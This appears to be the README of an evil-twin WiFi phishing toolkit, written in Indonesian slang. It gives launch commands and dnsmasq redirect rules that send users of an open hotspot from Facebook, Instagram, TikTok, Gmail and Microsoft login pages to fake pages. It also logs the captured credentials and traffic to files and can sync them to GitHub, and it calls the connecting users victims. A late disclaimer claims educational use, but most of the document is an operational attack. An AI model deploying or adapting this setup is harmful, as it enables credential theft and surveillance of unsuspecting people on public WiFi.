# 🔥 MZKYZAK HOTSPOT - TAHAP PERBAIKAN

# 💀 NUMPANG HOTSPOT DATA LO KETAHUAN - GENZ HACKER EDITION

![MZKYZAK](https://img.shields.io/badge/MZKYZAK-HOTSPOT-red)
![Verified](https://img.shields.io/badge/ZXZBEDST-VERIFIED-orange)
![Real-time](https://img.shields.io/badge/REALTIME-MONITORING-green)
![Internet](https://img.shields.io/badge/INTERNET-SHARING-blue)
![Phishing](https://img.shields.io/badge/PHISHING-CAPTURE-yellow)
![Dashboard](https://img.shields.io/badge/LIVE-DASHBOARD-purple)

**"Bro, lu numpang hotspot aja, data lo udah ketahuan semua! 😈🔥"**

Sistem hotspot profesional buat red team testing dan edukasi keamanan jaringan. Korban bisa akses internet beneran, tapi semua aktivitas mereka ke-pantau realtime!

## ✨ **ALL FITUR LENGKAP**

### 🌐 **INTERNET SHARING SYSTEM**
- **Ethernet Detection** - Auto detect koneksi ethernet
- **Real Internet** - Korban dapet internet beneran via koneksi lu
- **NAT Routing** - Traffic di-route otomatis
- **IP Forwarding** - Enabled otomatis

### 🔴 **REALTIME MONITORING**
- **Live Dashboard** - `http://192.168.1.1/` buat pantau realtime
- **Connected Clients** - Liat siapa aja yang connect
- **Traffic Logging** - Semua aktivitas ke-log
- **Credential Capture** - Login credentials auto ke-tangkep

### 💀 **PHISHING & CAPTURE**
- **Smart DNS Spoofing** - Sosmed redirect ke phishing page
- **Multi-Platform** - Support FB, IG, Twitter, TikTok, WhatsApp
- **Auto Credential Log** - Credentials save otomatis ke file
- **Captive Portal Handling** - Support Android/iOS detection

### 📱 **HOTSPOT MANAGEMENT**
- **SSID Custom** - `mzkyzak_hotspot` (bisa di-custom)
- **Open Network** - Ga pake password (biar gampang connect)
- **DHCP Server** - Auto IP assignment
- **Channel Control** - Bisa ganti channel

### ⚡ **SCRIPT SYSTEM**
- **One-Click Start** - `sudo ./start.sh` langsung jalan
- **Auto Cleanup** - Network restore otomatis kalo stop
- **Multiple Scripts** - Versi realtime, standalone, dll
- **Error Handling** - Auto fix common errors

### 📊 **DATA MANAGEMENT**
- **Local Logging** - Save credentials ke `/tmp/`
- **GitHub Sync** - Optional sync ke GitHub
- **Real-time Display** - Monitor di terminal
- **Persistence** - Logs tetep aman

### 🔧 **CONFIGURATION**
- **Easy Config** - File konfigurasi di folder `setup/`
- **Custom Payloads** - Phishing pages di folder `payloads/`
- **Flexible DNS** - Bisa pilih redirect semua atau selective
- **Network Control** - Bisa disable/enable internet sharing

## 🚀 **GETTING STARTED - CARA CEPET**

### **Persiapan System**
```bash
# Clone/pindah ke folder
cd /home/mzkyzak/Dokumen/virus_hospot

# Bikin semua script executable
chmod +x start.sh start_mzkyzak_hotspot.sh push_to_github.sh
```

### **Jalanin Hotspot**
```bash
# PAKE INI! (Single command, semua fitur include)
sudo ./start.sh

# Atau pake versi lengkap
sudo ./start_mzkyzak_hotspot.sh

# Atau versi realtime dengan dashboard
sudo ./mzkyzak_realtime_hotspot.sh
```

### **Monitoring Live**
```bash
# Di terminal TERPISAH, pantau aktivitas:
tail -f /tmp/mzkyzak_credentials.txt
sudo arp -a | grep wlan0

# Atau buka dashboard di browser:
# http://192.168.1.1/
```

## 📡 **HOTSPOT SPECIFICATIONS**

| **Parameter** | **Value** | **Keterangan** |
|--------------|-----------|----------------|
| **SSID** | `mzkyzak_hotspot` | Nama WiFi yang muncul |
| **Security** | Open Network | Ga pake password |
| **Channel** | 6 | Channel WiFi (bisa diubah) |
| **IP Range** | 192.168.1.100-200 | DHCP range untuk client |
| **Gateway** | 192.168.1.1 | IP gateway/router |
| **DNS** | 192.168.1.1 | DNS server lokal |
| **Mode** | 802.11g | WiFi mode |

## 🎯 **TARGET PHISHING - SOSMED YANG DI-REDIRECT**

### **Social Media Platforms**
- `facebook.com`, `www.facebook.com`, `fb.com`, `m.facebook.com`
- `instagram.com`, `www.instagram.com`, `m.instagram.com`
- `twitter.com`, `www.twitter.com`, `x.com`, `mobile.twitter.com`
- `tiktok.com`, `www.tiktok.com`, `vm.tiktok.com`
- `whatsapp.com`, `web.whatsapp.com`, `api.whatsapp.com`

### **Other Services**
- `gmail.com`, `mail.google.com`
- `youtube.com`, `accounts.youtube.com`
- `google.com` (login pages)
- `login.live.com` (Microsoft)

**Flow Kerja:**  
Korban buka FB/IG → DNS redirect ke server kita → Tampilin phishing page → Korban masukin credentials → Credentials ke-capture → Redirect ke internet normal

## 📊 **MONITORING & DATA CAPTURE**

### **Live Monitoring Commands**
```bash
# 1. Liat credentials yang ke-capture
tail -f /tmp/mzkyzak_credentials.txt

# 2. Liat access log (siapa akses apa)
tail -f /tmp/mzkyzak_access.log

# 3. Liat connected clients
sudo arp -a | grep wlan0

# 4. Liat DNS queries
tail -f /tmp/dnsmasq_mzkyzak.log

# 5. Capture traffic (advanced)
sudo tcpdump -i wlan0 -s 0 -w capture.pcap
```

### **Web Dashboard**
Buka browser → `http://192.168.1.1/`  
Fitur dashboard:
- Live connected clients
- Credentials captured count
- Recent traffic log
- System statistics
- Auto-refresh every 2 seconds

## 🛠️ **FILE STRUCTURE - ORGANIZED**

```
mzkzyak_hotspot/
├── 📄 README.md                    # Dokumentasi ini
├── ⚡ start.sh                     # SINGLE SCRIPT UTAMA
├── 🔴 start_mzkyzak_hotspot.sh    # Script lengkap
├── 📈 mzkyzak_realtime_hotspot.sh # Dengan dashboard
├── 🌐 hotspot_final_internet.sh   # Versi internet sharing
├── 🔒 final_hotspot_perfect.sh    # Standalone version
├── 🐍 hotspot_pro.py              # Python helper
├── 📝 data_logger.py              # Data logging system
├── 🛑 stop_hotspot_asus.sh        # Stop script
├── 📤 push_to_github.sh           # Push logs ke GitHub
│
├── ⚙️ setup/                       # Configuration files
│   ├── hostapd_simple.conf       # Main hostapd config
│   ├── hostapd.conf              # Alternative config
│   └── dnsmasq.conf              # DNS configuration
│
└── 🎣 payloads/                   # Phishing pages
    ├── login_facebook.html       # Facebook phishing
    ├── login_instagram.html      # Instagram phishing
    └── index.html                # Default page
```

## 🌐 **INTERNET SHARING SYSTEM**

### **How It Works**
1. **Detection** - System auto detect ethernet interface (`eth0`/`enpXsX`)
2. **Testing** - Cek koneksi internet via ping ke `8.8.8.8`
3. **Configuration** - Enable IP forwarding dan setup NAT
4. **Routing** - Client traffic di-route via ethernet lu

### **Technical Flow**
```
Client Device → mzkyzak_hotspot → wlan0 (192.168.1.1) → NAT → eth0 → Internet
         ↑                                 ↓
    Get IP via DHCP                 Traffic monitoring
    Access phishing pages           Credential capture
    Browse normal internet          Log all activities
```

### **Internet Status**
- **✅ WITH INTERNET** - Client bisa akses semua website
- **❌ NO INTERNET** - Client cuma bisa akses phishing pages
- **🔄 AUTO SWITCH** - System auto detect dan adjust

## 🔧 **ADVANCED CONFIGURATION**

### **Customize SSID**
Edit file `setup/hostapd_simple.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=mzkyzak_hotspot    # <-- GANTI NAMA DISINI
channel=6
hw_mode=g
```

### **Custom DNS Rules**
Edit file `setup/dnsmasq.conf`:
```ini
# Redirect specific sites
address=/facebook.com/192.168.1.1
address=/instagram.com/192.168.1.1

# Add your own targets
address=/your-target.com/192.168.1.1
```

### **Custom Phishing Pages**
Edit file di folder `payloads/`:
- `login_facebook.html` - Facebook phishing
- `login_instagram.html` - Instagram phishing  
- Buat file baru buat target custom

## 📈 **GITHUB INTEGRATION**

### **Push Logs to GitHub**
```bash
# 1. Setup GitHub repo dulu
./push_to_github.sh

# 2. Ikuti prompt, masukin repo URL
# 3. Logs auto sync setiap 60 detik
```

### **Automatic Sync Features**
- Credentials log sync
- Access log sync  
- Traffic statistics
- System reports
- Timestamped entries

## ⚠️ **LEGAL & ETHICAL GUIDELINES**

### **DISCLAIMER PENTING!**
**INI TOOL BUAT EDUKASI DAN SECURITY TESTING DOANG!**

### **Rules of Engagement**
1. **Authorized Use Only** - Pake cuma di jaringan yang lu punya/izin
2. **No Malicious Intent** - Jangan pake buat ngerugiin orang
3. **Educational Purpose** - Buat belajar keamanan jaringan
4. **Legal Compliance** - Patuhi semua hukum yang berlaku

### **Permitted Uses**
- ✅ Testing jaringan sendiri
- ✅ Educational demonstrations  
- ✅ Security research
- ✅ Red team exercises (with authorization)

### **Prohibited Uses**
- ❌ Unauthorized network access
- ❌ Credential theft for malicious purposes
- ❌ Privacy invasion
- ❌ Any illegal activities

## 🐛 **TROUBLESHOOTING GUIDE**

### **Common Issues & Solutions**

#### **Issue: "Korban ga dapet internet"**
```bash
# Cek ethernet connection
ping 8.8.8.8

# Cek IP forwarding
cat /proc/sys/net/ipv4/ip_forward

# Cek iptables rules
sudo iptables -t nat -L
```

#### **Issue: "wlan0 not found/not working"**
```bash
# List network interfaces
ip link show

# Check WiFi adapter
iwconfig

# Set monitor mode manually
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

#### **Issue: "Permission denied errors"**
```bash
# Run with sudo
sudo ./start.sh

# Check file permissions
ls -la *.sh
chmod +x *.sh

# Check user groups
groups
sudo usermod -aG sudo $USER
```

#### **Issue: "DNS not resolving"**
```bash
# Check dnsmasq running
ps aux | grep dnsmasq

# Check DNS config
cat /tmp/dnsmasq_mzkyzak.conf

# Test DNS resolution
nslookup facebook.com 192.168.1.1
```

#### **Issue: "No clients connecting"**
```bash
# Check hotspot broadcasting
sudo iwconfig wlan0

# Check SSID visibility
# (Coba connect dari device lain)

# Change channel if needed
# Edit setup/hostapd_simple.conf channel=1
```

## 🔄 **UPDATES & MAINTENANCE**

### **Keeping System Updated**
```bash
# Check for script updates
git pull origin main  # Jika pake git

# Update dependencies
sudo apt update
sudo apt install hostapd dnsmasq python3
```

### **Regular Maintenance**
1. Clear old logs: `rm -f /tmp/mzkyzak_*.log`
2. Update phishing pages
3. Test with different devices
4. Backup configuration files

## 🤝 **CONTRIBUTION & SUPPORT**

### **Want to Improve?**
1. Fork repository
2. Create feature branch
3. Commit changes
4. Push to branch
5. Create Pull Request

### **Need Help?**
- Check troubleshooting section
- Review configuration files
- Test with minimal setup
- Consult networking basics

### **Community Guidelines**
- Be respectful
- Share knowledge
- Follow ethical practices
- Help improve security

## 📞 **CONTACT & COLLABORATION**

Buat kolaborasi security research, edukasi, atau red team exercises.

**Remember:** Security is about protection, not exploitation.

---

## 🎯 **QUICK REFERENCE CARD**

### **Essential Commands**
```bash
# START: sudo ./start.sh
# STOP: Ctrl+C in running terminal
# MONITOR: tail -f /tmp/mzkyzak_credentials.txt
# CLIENTS: sudo arp -a | grep wlan0
# DASHBOARD: http://192.168.1.1/
```

### **Key Files**
- `start.sh` - Main script
- `setup/hostapd_simple.conf` - Hotspot config
- `setup/dnsmasq.conf` - DNS config
- `payloads/` - Phishing pages

### **Important Logs**
- `/tmp/mzkyzak_credentials.txt` - Captured credentials
- `/tmp/mzkyzak_access.log` - Access log
- `/tmp/dnsmasq_mzkyzak.log` - DNS queries

---

**🔥 MZKYZAK HOTSPOT SYSTEM**  
**💀 ZAK? VERIFIED - RED TEAM EDITION**  
**⚡ SSID: mzkyzak_hotspot | REAL INTERNET | REALTIME MONITORING**  

**"Stay curious, stay ethical, stay secure."** 🔐
